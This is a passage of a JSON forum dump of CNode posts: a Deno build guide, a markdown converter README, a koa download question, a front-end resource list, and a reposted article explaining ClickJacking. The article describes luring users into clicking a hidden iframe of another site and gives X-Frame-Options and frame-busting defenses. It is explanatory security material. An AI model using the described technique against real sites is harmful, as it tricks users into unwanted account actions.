完成转换，效果如下：</p>\n<p><img src=\"https://i.loli.net/2019/01/21/5c449ca8d869e.png\" alt=\"20190121000703.png\"></p>\n<p><img src=\"https://i.loli.net/2019/01/21/5c449cb443d62.png\" alt=\"20190121000715.png\"></p>\n<h2>更新日志</h2>\n<ul>\n<li>v2.2.0 增加命令行模式</li>\n<li>v2.0.0 使用 node 原生 https 模块，发送请求数据获取内容，不需要安装 chromium，没有软件权限问题</li>\n<li>v1.1.2 使用谷歌 puppeteer 作为无头浏览器获取内容，需要安装 chromium，macOS 中可能有权限问题</li>\n</ul>\n<h2>常见问题</h2>\n<ul>\n<li>v1.1.2\n<ul>\n<li>报错：spawn EACCES\n<ul>\n<li>常见于 macOS，请保证 chromium 已被正常安装</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h2>免责</h2>\n<ul>\n<li>不提供用户名和密码，需使用用户自己的账号密码登录</li>\n<li>仅作为技术讨论，学习和研究使用</li>\n</ul>\n<h2>隐私</h2>\n<ul>\n<li>该项目不会存储和发送任何用户隐私数据</li>\n</ul>\n<h2>License</h2>\n<p>The MIT License (MIT)\nCopyright © 2019 OliverYoung</p>\n<p>Permission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the “Software”), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:</p>\n<p>The above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.</p>\n<p>THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND,\nEXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF\nMERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.\nIN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM,\nDAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR\nOTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE\nOR OTHER DEALINGS IN THE SOFTWARE.</p>\n</div>","title":"🔥 掘金小册 markdown 转换器","last_reply_at":"2019-01-26T15:45:53.744Z","good":false,"top":false,"reply_count":2,"visit_count":880,"create_at":"2019-01-22T15:30:51.806Z","author":{"loginname":"oliyg","avatar_url":"https://avatars1.githubusercontent.com/u/19631785?v=4&s=120"}},{"id":"5c4a82dcf9075c1ef7137f6e","author_id":"5875bd3d06fa6e2a4e4f730b","tab":"share","content":"<div class=\"markdown-text\"><p>deno原本在我不被重视技术列表中，但在github的年度开源star榜单上，斩获年度第四。让我不得不思考为什么deno能广受好评，我想我需要刨开deno看看了。</p>\n<h1>编译</h1>\n<p>为什么不能直接解刨，呃。。。这和我的习惯有关系，我喜欢先编译，并一步一步调试，毕竟源码是不可能骗人的，再加上我喜欢魔改的臭习惯。废话不多说，开搞。</p>\n<p><code>本次编译在mac上进行，其他系统可能不是很适应</code></p>\n<p>步骤如下：</p>\n<ol>\n<li>安装rust，并注意安装nightly的rust。</li>\n</ol>\n<ul>\n<li>为什么要安装nightly的rust？\n<ul>\n<li>这个原因可以说是作者比较激进，有很多地方使用了实验性特性，导致有些地方编译的时候正式版的特性还不足以支持。在这点基础上，我认为作者也是将deno定位激进的先进产品，或许这点我不敢苟同。。。</li>\n</ul>\n</li>\n</ul>\n<p>安装rust，并用rust的版本控制器使用rustup切换到nightly。</p>\n<p>注: rustup可以理解为node的nvm。</p>\n<p>命令如下：</p>\n<pre class=\"prettyprint language-sh\"><code>curl https:&#x2F;&#x2F;sh.rustup.rs -sSf | sh\nrustup install nightly\nrustup default nightly\n</code></pre><ol>\n<li>安装Xcode打开，同意一下各种不平等条款，再打开运行一下，并切换到当前的Xcode版本。</li>\n</ol>\n<p>命令如下：</p>\n<pre class=\"prettyprint language-sh\"><code>sudo xcode-select -s &#x2F;Applications&#x2F;Xcode.app\n</code></pre><ol>\n<li>准备工作基本完成了，接下来需要克隆仓库了</li>\n</ol>\n<p><code>注意</code>：这里必须使用–recurse-submodules参数，原因是deno将多个仓库作为了子模块进行开发，包括deno_std和third_party等等。</p>\n<pre class=\"prettyprint language-sh\"><code>git clone --recurse-submodules https:&#x2F;&#x2F;github.com&#x2F;denoland&#x2F;deno.git\n</code></pre><ol>\n<li>使用工具安装第三方依赖</li>\n</ol>\n<p>感觉这一步就是单纯实现的懒人神器功能。</p>\n<p><code>注意</code>:这里必须开启终端翻墙，否则会失败，因为这里会同步谷歌源代码管理中心的数据，包括v8的同步，很重要！</p>\n<pre class=\"prettyprint language-sh\"><code>cd deno\n.&#x2F;tools&#x2F;setup.py\n</code></pre><ol>\n<li>编译</li>\n</ol>\n<p>编译就是漫长的等待了</p>\n<pre class=\"prettyprint language-sh\"><code>cd deno\n.&#x2F;tools&#x2F;build.py # 如果要构建release，请DENO_BUILD_MODE=release\n</code></pre><p>直到输出:</p>\n<pre class=\"prettyprint\"><code>ninja: Entering directory &#96;&#x2F;xxx&#x2F;xxx&#x2F;deno&#x2F;target&#x2F;debug&#x27;\n</code></pre><p>到这里就成功了，你可以直接在/xxx/xxx/deno/target/debug中运行一下</p>\n<pre class=\"prettyprint language-sh\"><code>cd deno\ncd .&#x2F;target&#x2F;debug \n.&#x2F;deno #如果出现REPL交互就成功了\n</code></pre><h1>目录解析</h1>\n<pre class=\"prettyprint language-sh\"><code>&#x2F;build # 存储v8构建的配置，最后软链到&#x2F;third_party&#x2F;v8的目录中\n&#x2F;build_extra # 存储一些deno的构建配置\n&#x2F;buildtools # 顾名思义，一些构建工具，最后软链到&#x2F;third_party&#x2F;v8的目录中\n&#x2F;js # 这就是一些用js写的一些源码，这点和node的js部分有点像，只不过改成用ts写了\n&#x2F;libdeno #  我认为这是一个桥接v8和rust的适配器代码\n&#x2F;node_modules # 给&#x2F;js文件夹装的一些依赖，软链到&#x2F;third_party的目录中\n&#x2F;prebuilt # 因为切换到gn了，所以需要一些是否构建的检查，顾名思义，预构建的一些文件，都是自己生成的\n&#x2F;src # rust代码。像fs，http都在这里实现，就是实现一些浏览干不了的事情\n&#x2F;target # 编译后的文件，分debug和release，玩过rust的就知道，编译release比较久，因为编译器要做代码折叠\n&#x2F;testing # v8的测试用例，软链到&#x2F;third_party&#x2F;v8的目录中\n&#x2F;test # deno的测试用例\n&#x2F;third_party # 第三方依赖如flatbuffers和v8等等\n&#x2F;tools #各种杂七杂八的脚本，比如用于构建代码和检查代码格式等等。\n&#x2F;website #deno的官方网站\n</code></pre><p>针对目录解析，可能大家会有几个问题：</p>\n<ul>\n<li>问题1:为什么要一个libdeno做rust的桥接器？\n<ul>\n<li>因为V8是C++写的，同时V8很多自己的结构，那么你要rust要较好的使用，你就必须写一个桥接器来让rust和V8能购相互调用。</li>\n</ul>\n</li>\n<li>问题2:为什么要用rust而不像node一样，直接在v8上累代码？\n<ul>\n<li>因为这样可以减少对V8的依赖，比如V8底层一变，上层就需要大变，这样对运行时开发者来说无疑是心智负担。</li>\n</ul>\n</li>\n<li>问题3:那么这样做deno对我们什么好处呢？\n<ul>\n<li>对于普通开发者：1.deno其实设计就是想趋于浏览器，那么比如像node的require这种全局变量本身其实就不应该存在的，因为浏览器中没有这样的全局变量，且这种全局变量还会造成很大的安全问题，所以要解决这个问题，但又要可以操作文件和http等操作，解决途径就是不暴露这样的全局变量，将deno做为一个import可以引进来的库，这样既可以和浏览器趋同，又不会暴露全局。2.抹平了大部分和浏览器的区别，比如相同代码在浏览器和运行时的结果不同，同时更加兼容，移植JS更加方便。</li>\n<li>对于运行时开发者：1.抛弃了gyp使用了gn，改一行代码再也不用全量编译了。2.V8引擎的修改，再也不需要牵一发而动全身了。3.一句话总结就是降低了开发者的心智负担。</li>\n</ul>\n</li>\n</ul>\n<h1>结语</h1>\n<p>这篇文章作为deno的先导篇，有机会还会在写，但不保证这不是最后一篇。deno确实有很多优势，这也让我改变了一些对它的评价，但作为一个划时代的产品，我认为多少还是差了一点意思，只能说期待deno更亮眼的功能吧。</p>\n<p>重点:deno是可以运行js的！deno是可以运行js的！deno是可以运行js的！重要的事情说三遍。所以完全不用担心deno会抢node饭碗，如果是普通开发者，学习deno的成本，本人认为和学习一个库的成本差不多，所以不用过度担心，且deno在生产环境溜一溜的结果也未可知，等待deno什么时候GA，期待deno在生产环境的结果吧。</p>\n</div>","title":"编译deno，deno结构解析","last_reply_at":"2019-01-26T13:46:46.264Z","good":false,"top":false,"reply_count":5,"visit_count":994,"create_at":"2019-01-25T03:30:36.539Z","author":{"loginname":"zy445566","avatar_url":"https://avatars2.githubusercontent.com/u/14976489?v=4&s=120"}},{"id":"56e664efd62bdb576d051d1c","author_id":"568c81e73b33070b662708e0","tab":"share","content":"<div class=\"markdown-text\"><hr>\n<p>本文转载自 朱英达的个人网站，转载本文请注明出处。\n<a href=\"https://www.zhuyingda.com/blog/b6.html?origin=cnode\">原文地址</a></p>\n<hr>\n<p>除了XSS和CSRF之外，还有一个被称为ClickJacking的web安全漏洞常常被大家遗忘，但绝对不能忽略。\nClickJacking翻译过来叫做点击劫持，或者界面劫持。\n这个漏洞能够执行的关键在于html4.01提供的iframe标签，通过它web开发者可以实现页中页这样的东西。\n最初在道哥的那本《白帽子讲Web安全》里看到的了这个漏洞，要么是道哥在写这本书时故意想留一手，要么是我的阅读理解能力差，总之当时我还真就是不以为然的，为什么呢？\n利用透明的iframe去做一些文章对于web开发者来说根本不算什么难事，而如果已经把自己的iframe植入到别人的页面中去了，那我为什么不xss呢？\n突然有一天，我真正理解了这个漏洞真实的应用场景：我们真正要做的，并不是把自己的页面放到iframe里嵌入别人的页面，而是要把别人的页面利用iframe嵌入到自己的网站页面中来，再通过UI上面的欺骗，诱使用户“做他原本不想做的事情”。怎么样，细思极恐吧？</p>\n<p>下面展示一个具体的示例进行进一步说明：\n<img src=\"//static.cnodejs.org/FuBJK7IlHzSgwpiVJN4ngcshpMwe\" alt=\"1.jpg\">\n如上图所示，我构造了这样一个页面，这个页面可以放在我们自己的网站上，在其中插入一个iframe，嵌入了一个qq安全中心的页面，为了方便观察，我把iframe的透明度设置为0.5。\n由于iframe被设置了绝对定位而且其z-index值高于静态文档流，所以用户的所有click都会被这个iframe捕获，而透过iframe用户看到的是底下的DOM，红色的按钮上面写着“点我”，对用户起到诱导作用。\n当用户像往常一样点击红色的按钮时，他实际点到的是这个iframe中的DOM，这会触发qq安全中心页面当中的相应逻辑。\n如果把红色的按钮换成一张美女图片，这个漏洞对用户的诱导性将会很强。\n如果把iframe的透明度调到0，像这样：\n<img src=\"//static.cnodejs.org/FgLjDLsVAaB5pnkauL6R60IN3cPJ\" alt=\"2.jpg\"></p>\n<p>用户将会完全察觉不到在iframe这个页中页里面发生的任何事情，不知不觉中就踏入了黑客所精心构造的陷阱之中。\n我曾经在很多网站看到过这样的业务逻辑：根据用户的cookie识别登录状态，对于已登陆的用户，允许其通过点击一个按钮快速的冻结自己的账户，甚至修改自己的密码。\n事实上，把这个漏洞的危害说大一点，黑客不仅可以劫持用户的鼠标点击，还可以劫持移动端WAP页面的各种手势，甚至是通过一系列诱导，引导用户键盘输入黑客想让用户输入的东西。\n这样的页面如果遭到黑客点击劫持，后果将会不堪设想。</p>\n<p>我们不知道会不会有人构造这样一个外层页面包裹我们自己的网站页面去进行界面劫持，那么我们应当如何进行防御呢？\n主要有两种办法：\n1.在页面的http头里加入“X-FRAME-OPTIONS”，将其值设为“DENY”即可阻止任何其他页面对当前页面在iframe中进行加载，此http属性支持IE8+浏览器。\n<img src=\"//static.cnodejs.org/FqZ6c6_GJCR1BGsJsuNUNcxTRvKR\" alt=\"3.jpg\">\n上面这段代码是Node.js的express框架中对页面的http头设置，以此可以实现，在其他页面中以iframe的方式加载此页面会被浏览器拦截：\n<img src=\"//static.cnodejs.org/FnEJJscKNJxNKobvInnS0RYBws3e\" alt=\"4.jpg\"></p>\n<p>2.通过javascript在页面中进行一些逻辑判断，具体的做法是这样：\n<img src=\"//static.cnodejs.org/FtdV9ijCAmk43rPMNQmqh6saEXkC\" alt=\"5.jpg\">\n把上面这段代码放到页面的head中，在加载时做预先判断。主要思路是，先把页面的body藏起来，判断此时页面并没有被嵌套在一个iframe时，再把body显示出来。</p>\n<p>对于点击劫持，网上还有很多js实现的防御判断，但由于年代久远和水平良莠不齐，很多判断可以通过多层嵌套iframe的方式将其绕过。\n以上总结的两条，亲测有效。\n此文章中涉及到的ClickJack相关代码都在我的开源项目<a href=\"https://github.com/zhuyingda/veneno\">veneno</a>中保存，此项目专注于web安全方面的所有攻击和防御行为进行实践，有兴趣可以看一下。</p>\n<hr>\n<p>本文转载自 朱英达的个人网站，转载本文请注明出处。\n<a href=\"https://www.zhuyingda.com/blog/b6.html?origin=cnode\">原文地址</a></p>\n<hr>\n</div>","title":"一个比较冷门但却不容小视的漏洞——ClickJacking","last_reply_at":"2019-01-26T06:50:05.913Z","good":true,"top":false,"reply_count":15,"visit_count":10223,"create_at":"2016-03-14T07:14:55.088Z","author":{"loginname":"zhuyingda","avatar_url":"https://avatars1.githubusercontent.com/u/9526467?v=4&s=120"}},{"id":"5c4bd4b0f9075c1ef7138406","author_id":"5c4bd2c9f9075c1ef71383f9","tab":"ask","content":"<div class=\"markdown-text\"><p>最近实习遇到个问题一直解决不了想请教一下大家。我们项目用的 koa 做中间层，然后有个下载文件的功能，后台返回的是个 zip 包的文件字节流。在网上找的全都是静态资源服务器的上传下载，没有找到如何处理接收到的字节流然后返回给前台这种情况，所以不太清楚怎么做，想请教一下大家，还有下载的时候返回一个地址和返回文件流这两种方式分别适合在什么场景下使用\n<img src=\"//static.cnodejs.org/Fkt0c2clXQNS7Pa8ie6_IDdvOcNY\" alt=\"image.png\"></p>\n</div>","title":"请教个 node 下载文件流的问题","last_reply_at":"2019-01-26T05:47:54.434Z","good":false,"top":false,"reply_count":1,"visit_count":542,"create_at":"2019-01-26T03:32:00.168Z","author":{"loginname":"zhang6223284","avatar_url":"https://avatars0.githubusercontent.com/u/23720937?v=4&s=120"}},{"id":"56ef3edd532839c33a99d00e","author_id":"54009f5ccd66f2eb37190485","tab":"share","content":"<div class=\"markdown-text\"><p><a href=\"https://github.com/AutumnsWind/Front-end-tutorial\">资源教程原文</a></p>\n<ol>\n<li>\n<p>综合类</p>\n<ul>\n<li><a href=\"http://www.cnblogs.com/sb19871023/p/3894452.html\">前端知识体系</a></li>\n<li><a href=\"https://github.com/JacksonTian/fks\">前端知识结构</a></li>\n<li><a href=\"https://github.com/unruledboy/WebFrontEndStack\">Web前端开发大系概览</a></li>\n<li><a href=\"http://www.cnblogs.com/unruledboy/p/WebFrontEndStack.html\">Web前端开发大系概览-中文版</a></li>\n<li><a href=\"https://raw.githubusercontent.com/unruledboy/WebFrontEndStack/master/Web%20Front%20End%20Stack.png\">Web Front-end Stack v2.2</a></li>\n<li><a href=\"https://github.com/justjavac/free-programming-books-zh_CN\">免费的编程中文书籍索引</a></li>\n<li><a href=\"https://github.com/dypsilon/frontend-dev-bookmarks\">前端书籍</a></li>\n<li><a href=\"https://github.com/vhf/free-programming-books\">前端免费书籍大全</a></li>\n<li><a href=\"http://www.cnblogs.com/sb19871023/p/3894452.html\">前端知识体系</a></li>\n<li><a href=\"https://github.com/justjavac/free-programming-books-zh_CN\">免费的编程中文书籍索引</a></li>\n<li><a href=\"http://study.163.com/course/introduction/224014.htm\">智能社 - 精通JavaScript开发</a></li>\n<li><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/A_re-introduction_to_JavaScript\">重新介绍 JavaScript（JS 教程）</a></li>\n<li><a href=\"http://v.163.com/special/opencourse/bianchengdaolun.html\">麻省理工学院公开课：计算机科学及编程导论</a></li>\n<li><a href=\"http://segmentfault.com/a/1190000002640298\">JavaScript中的this陷阱的最全收集–没有之一</a></li>\n<li><a href=\"https://llh911001.gitbooks.io/mostly-adequate-guide-chinese/content/ch1.html\">JS函数式编程指南</a></li>\n<li><a href=\"http://liubin.github.io/promises-book/\">JavaScript Promise迷你书（中文版）</a></li>\n<li><a href=\"https://github.com/AlloyTeam/Mars\">腾讯移动Web前端知识库</a></li>\n<li><a href=\"https://github.com/Front-End-Developers-Hunan/Front-End-Develop-Guide\">Front-End-Develop-Guide 前端开发指南</a></li>\n<li><a href=\"https://li-xinyang.gitbooks.io/frontend-notebook/content/\">前端开发笔记本</a></li>\n<li><a href=\"https://github.com/nieweidong/fetool\">大前端工具集 - 聂微东</a></li>\n<li><a href=\"https://dwqs.gitbooks.io/frontenddevhandbook/content/\">前端开发者手册</a></li>\n</ul>\n</li>\n<li>\n<p>入门类</p>\n<ul>\n<li><a href=\"http://www.cnblogs.com/jikey/p/3613082.html\">前端入门教程</a></li>\n<li><a href=\"http://www.liaoxuefeng.com/wiki/001434446689867b27157e896e74d51a89c25cc8b43bdb3000\">瘳雪峰的Javascript教程</a></li>\n<li><a href=\"http://www.imooc.com/view/11\">jQuery基础教程</a></li>\n<li><a href=\"http://www.imooc.com/view/506\">前端工程师必备的PS技能——切图篇</a></li>\n<li><a href=\"https://github.com/qiu-deqing/FE-learning\">结合个人经历总结的前端入门方法</a></li>\n</ul>\n</li>\n<li>\n<p>效果类</p>\n<ul>\n<li><a href=\"http://www.imooc.com/learn/58\">弹出层</a></li>\n<li><a href=\"http://www.imooc.com/learn/18\">焦点图轮播特效</a></li>\n</ul>\n</li>\n<li>\n<p>工具类</p>\n<ul>\n<li><a href=\"http://www.imooc.com/learn/93\">css sprite 雪碧图制作</a></li>\n<li><a href=\"http://www.imooc.com/learn/390\">版本控制入门 – 搬进 Github</a></li>\n<li><a href=\"http://www.imooc.com/learn/30\">Grunt-beginner前端自动化工具</a></li>\n</ul>\n</li>\n<li>\n<p>慕课专题</p>\n<ul>\n<li><a href=\"http://www.imooc.com/space/teacher/id/197450\">张鑫旭 - 慕课系列</a></li>\n<li><a href=\"http://www.imooc.com/space/teacher/id/104593\">lyn - 慕课系列</a></li>\n<li><a href=\"http://www.imooc.com/space/teacher/id/290139\">艾伦 - 慕课系列</a></li>\n<li><a href=\"http://www.imooc.com/view/494\">碧仔 - Hello，移动WEB</a></li>\n</ul>\n</li>\n<li>\n<p>周报类</p>\n<ul>\n<li><a href=\"https://github.com/PaicHyperionDev/MobileDevWeekly\">平安科技移动开发二队技术周报</a></li>\n</ul>\n</li>\n</ol>\n<h3>六. API:</h3>\n<h4>1. 总目录</h4>\n<ol>\n<li>\n<p>开发中心</p>\n<ul>\n<li><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript\">mozilla js参考</a></li>\n<li><a href=\"https://developer.chrome.com/extensions/api_index.html\">chrome开发中心（chrome的内核已转向blink）</a></li>\n<li><a href=\"https://developer.apple.com/library/safari/navigation\">safari开发中心</a></li>\n<li><a href=\"https://msdn.microsoft.com/zh-cn/library/d1et7k7c(v=vs.94).aspx\">microsoft js参考</a></li>\n<li><a href=\"http://sanshi.me/articles/JavaScript-Garden-CN/html/index.html\">js秘密花园</a></li>\n<li><a href=\"http://bonsaiden.github.io/JavaScript-Garden/zh/\">js秘密花园</a></li>\n<li><a href=\"http://www.w3help.org/\">w3help</a> 综合Bug集合网站</li>\n</ul>\n</li>\n<li>\n<p>综合搜索</p>\n<ul>\n<li><a href=\"http://www.javascripting.com/\">javascripting</a></li>\n<li><a href=\"http://microjs.com/\">各种流行库搜索</a></li>\n</ul>\n</li>\n<li>\n<p>综合API</p>\n<ul>\n<li><a href=\"http://www.runoob.com/\">runoob.com-包含各种API集合</a></li>\n<li><a href=\"http://tool.oschina.net/apidocs\">开源中国在线API文档合集</a></li>\n<li><a href=\"http://devdocs.io/\">devdocs</a> 英文综合API网站</li>\n</ul>\n</li>\n</ol>\n<h4>2. jQuery</h4>\n<ul>\n<li><a href=\"http://www.jquery123.com/\">jQuery API 中文文档</a></li>\n<li><a href=\"http://hemin.cn/jq/\">hemin 在线版</a></li>\n<li><a href=\"http://www.css88.com/jqapi-1.9/on/\">css88 jq api</a></li>\n<li><a href=\"http://www.css88.com/jquery-ui-api/\">css88 jqui api</a></li>\n<li><a href=\"http://learn.jquery.com/\">学习jquery</a></li>\n<li><a href=\"http://james.padolsey.com/jquery/\">jquery 源码查找</a></li>\n</ul>\n<h4>3. Ecmascript</h4>\n<ul>\n<li><a href=\"https://leanpub.com/understandinges6/read\">Understanding ECMAScript 6 - Nicholas C. Zakas</a></li>\n<li><a href=\"https://leanpub.com/exploring-es6/read\">exploring-es6</a></li>\n<li><a href=\"https://github.com/es6-org/exploring-es6\">exploring-es6翻译</a></li>\n<li><a href=\"http://es6-org.github.io/exploring-es6/\">exploring-es6翻译后预览</a></li>\n<li><a href=\"http://es6.ruanyifeng.com/\">阮一峰 es6</a></li>\n<li><a href=\"http://javascript.ruanyifeng.com/\">阮一峰 Javascript</a></li>\n<li><a href=\"http://yanhaijing.com/es5/\">ECMA-262，第 5 版</a></li>\n<li><a href=\"http://es5.github.io/\">es5</a></li>\n</ul>\n<h4>4. Js template</h4>\n<ul>\n<li><a href=\"http://garann.github.io/template-chooser/\">template-chooser</a></li>\n<li><a href=\"https://github.com/aui/artTemplate\">artTemplate</a></li>\n<li><a href=\"https://github.com/aui/tmodjs/blob/master/README.md\">tomdjs</a></li>\n<li><a href=\"http://juicer.name/docs/docs_zh_cn.html\">淘宝模板juicer模板</a></li>\n<li><a href=\"http://koen301.github.io/fxtpl/\">Fxtpl v1.0 繁星前端模板引擎</a></li>\n<li><a href=\"http://laytpl.layui.com/\">laytpl</a></li>\n<li><a href=\"https://github.com/mozilla/nunjucks\">mozilla - nunjucks</a></li>\n<li><a href=\"https://github.com/PaulGuo/Juicer\">Juicer</a></li>\n<li><a href=\"http://akdubya.github.io/dustjs/\">dustjs</a></li>\n<li><a href=\"http://ecomfe.github.io/etpl/\">etpl</a></li>\n</ul>\n<h4>5. 弹出层</h4>\n<ul>\n<li><a href=\"https://github.com/aui/artDialog\">artDialog 最新版</a></li>\n<li><a href=\"http://aui.github.io/artDialog/doc/index.html\">artDialog 文档</a></li>\n<li><a href=\"https://code.google.com/p/artdialog/downloads/list\">google code 下载地址</a></li>\n<li><a href=\"http://layer.layui.com/\">贤心弹出层</a></li>\n<li><a href=\"https://github.com/bh-lay/UI\">响应式用户交互组件库</a></li>\n<li><a href=\"http://t4t5.github.io/sweetalert/\">sweetalert-有css3动画弹出层</a></li>\n</ul>\n<h4>6. CSS</h4>\n<ul>\n<li><a href=\"http://tympanus.net/codrops/css_reference/\">CSS 语法参考</a></li>\n<li><a href=\"http://isux.tencent.com/css3/index.html\">CSS3动画手册</a></li>\n<li><a href=\"http://isux.tencent.com/css3/tools.html\">腾讯css3动画制作工具</a></li>\n<li><a href=\"http://linxz.github.io/tianyizone/\">志爷css小工具集合</a></li>\n<li><a href=\"http://www.note12.com/category/blog/2014-6-5/538fe0a9f786f1b7019a4dfb\">css3 js 移动大杂烩</a></li>\n<li><a href=\"http://bouncejs.com/\">bouncejs 触摸库</a></li>\n<li><a href=\"http://fian.my.id/Waves/\">css3 按钮动画</a></li>\n<li><a href=\"http://daneden.github.io/animate.css/\">animate.css</a></li>\n<li><a href=\"http://www.alloyteam.com/2015/10/8536/\">全局CSS的终结(狗带) [译]</a></li>\n</ul>\n<h4>7. Angularjs</h4>\n<ul>\n<li><a href=\"https://github.com/dolymood/AngularLearning\">Angular.js 的一些学习资源</a></li>\n<li><a href=\"http://angularjs.cn/\">angularjs中文社区</a></li>\n<li><a href=\"http://www.cnblogs.com/xuwenmin888/p/3739096.html\">Angularjs源码学习</a></li>\n<li><a href=\"http://www.ifeenan.com/?c=AngularJS\">Angularjs源码学习</a></li>\n<li><a href=\"http://angular-ui.github.io/bootstrap/\">angular对bootstrap的封装</a></li>\n<li><a href=\"https://cnodejs.org/topic/51404e0f069911196d2e3923\">angularjs + nodejs</a></li>\n<li><a href=\"http://www.cnblogs.com/lvdabao/tag/AngularJs/\">吕大豹 Angularjs</a></li>\n<li><a href=\"http://www.infoq.com/cn/news/2013/02/angular-web-app\">AngularJS 最佳实践</a></li>\n<li><a href=\"http://www.lovelucy.info/angularjs-best-practices.html\">Angular的一些扩展指令</a></li>\n<li><a href=\"https://github.com/Pasvaz/bindonce\">Angular数据绑定原理</a></li>\n<li><a href=\"https://github.com/angular-ui/\">一些扩展Angular UI组件</a></li>\n<li><a href=\"http://voidcanvas.com/emberjs-vs-angularjs-performance-testing/\">Ember和AngularJS的性能测试</a></li>\n<li><a href=\"http://www.cnblogs.com/powertoolsteam/p/angularjs-introdection.html\">带你走近AngularJS - 基本功能介绍</a></li>\n<li><a href=\"http://angular.duapp.com/docs/guide\">Angularjs开发指南</a></li>\n<li><a href=\"http://www.cnblogs.com/amosli/p/3710648.html\">Angularjs学习</a></li>\n<li><a href=\"http://www.rainweb.cn/article/angularjs-jquery.html\">不要带着jQuery的思维去学习AngularJS</a></li>\n<li><a href=\"http://wangjiatao.diandian.com/?tag=angularjs\">angularjs 学习笔记</a></li>\n<li><a href=\"http://www.angularjs.cn/T008\">angularjs 开发指南</a></li>\n<li><a href=\"https://github.com/jmcunningham/AngularJS-Learning\">angularjs 英文资料</a></li>\n<li><a href=\"http://angular-ui.github.io/bootstrap/\">angular bootstrap</a></li>\n<li><a href=\"https://github.com/opitzconsulting/jquery-mobile-angular-adapter\">angular jq mobile</a></li>\n<li><a href=\"http://mgcrea.github.io/angular-strap/\">angular ui</a></li>\n<li><a href=\"http://www.tuicool.com/articles/7ZZVr2\">整合jQuery Mobile+AngularJS经验谈</a></li>\n<li><a href=\"http://blog.jobbole.com/46589/\">有jQuery背景，该如何用AngularJS编程思想</a></li>\n<li><a href=\"http://each.sinaapp.com/angular/\">AngularJS在线教程</a></li>\n<li><a href=\"http://www.zouyesheng.com/angular.html\">angular学习笔记</a></li>\n</ul>\n<h4>8. React</h4>\n<ul>\n<li><a href=\"http://www.react-china.org/\">react.js 中文论坛</a></li>\n<li><a href=\"https://facebook.github.io/react/index.html\">react.js 官方网址</a></li>\n<li><a href=\"https://facebook.github.io/react/docs/getting-started.html\">react.js 官方文档</a></li>\n<li><a href=\"http://material-ui.com/#/\">react.js material UI</a></li>\n<li><a href=\"http://touchstonejs.io/\">react.js TouchstoneJS UI</a></li>\n<li><a href=\"http://amazeui.org/react/\">react.js amazeui UI</a></li>\n<li><a href=\"http://www.ruanyifeng.com/blog/2015/03/react.html\">React 入门实例教程 - 阮一峰</a></li>\n<li><a href=\"http://wiki.jikexueyuan.com/project/react-native/\">React Native 中文版</a></li>\n<li><a href=\"http://www.html-js.com/article/Fakefish%203053\">Webpack 和 React 小书 - 前端乱炖</a></li>\n<li><a href=\"https://fakefish.github.io/react-webpack-cookbook/\">Webpack 和 React 小书 - gitbook</a></li>\n<li><a href=\"https://github.com/webpack/webpack\">webpack</a></li>\n<li><a href=\"http://html-js.com/article/3009\">Webpack，101入门体验</a></li>\n<li><a href=\"http://html-js.com/article/3113\">webpack入门教程</a></li>\n<li><a href=\"http://segmentfault.com/a/1190000003499526\">基于webpack搭建前端工程解决方案探索</a></li>\n<li><a href=\"http://www.piliyu.com/\">React原创实战视频教程</a></li>\n</ul>\n<h4>9. 移动端API</h4>\n<ol>\n<li>API\n<ul>\n<li><a href=\"https://github.com/jtyjty99999/mobileTech\">99移动端知识集合</a></li>\n<li><a href=\"https://github.com/AlloyTeam/Mars\">移动端前端开发知识库</a></li>\n<li><a href=\"http://caibaojian.com/mobile-web-bug.html\">移动前端的一些坑和解决方法（外观表现）</a></li>\n<li><a href=\"http://www.cnblogs.com/PeunZhang/p/3407453.html\">【原】移动web资源整理</a></li>\n<li><a href=\"http://mweb.baidu.com/zeptoapi/\">zepto 1.0 中文手册</a></li>\n<li><a href=\"http://www.html-5.cn/Manual/Zepto/\">zepto 1.0 中文手册</a></li>\n<li><a href=\"http://www.css88.com/doc/zeptojs_api/\">zepto 1.1.2</a></li>\n<li><a href=\"http://www.cnblogs.com/sky000/archive/2013/03/29/2988952.html\">zepto 中文注释</a></li>\n<li><a href=\"http://app-framework-software.intel.com/api.php\">jqmobile 手册</a></li>\n<li><a href=\"https://github.com/maxzhang/maxzhang.github.com/issues\">移动浏览器开发集合</a></li>\n<li><a href=\"https://github.com/hoosin/mobile-web-favorites\">移动开发大杂烩</a></li>\n<li><a href=\"http://lin-chao.github.io/2014/11/14/%E5%BE%AE%E4%BF%A1webview%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/\">微信webview中的一些问题</a></li>\n</ul>\n</li>\n<li>框架\n<ul>\n<li><a href=\"http://framework7.taobao.org/\">特色的HTML框架可以创建精美的iOS应用</a></li>\n<li><a href=\"http://m.sui.taobao.org/\">淘宝SUI</a></li>\n</ul>\n</li>\n</ol>\n<h4>10. avalon</h4>\n<ul>\n<li><a href=\"http://avalonjs.github.io/\">avalonjs</a></li>\n<li><a href=\"http://ued.qunar.com/oniui/index.html\">Avalon新一代UI库： OniUI</a></li>\n<li><a href=\"https://github.com/RubyLouvre/avalon.oniui\">avalon.oniui-基于avalon的组件库</a></li>\n<li><a href></a></li>\n</ul>\n<h4>11. Requriejs</h4>\n<ul>\n<li><a href=\"http://www.ruanyifeng.com/blog/2012/10/javascript_module.html\">Javascript模块化编程（一）：模块的写法 </a></li>\n<li><a href=\"http://www.ruanyifeng.com/blog/2012/10/asynchronous_module_definition.html\">Javascript模块化编程（二）：AMD规范</a></li>\n<li><a href=\"http://www.ruanyifeng.com/blog/2012/11/require_js.html\">Javascript模块化编程（三）：require.js的用法</a></li>\n<li><a 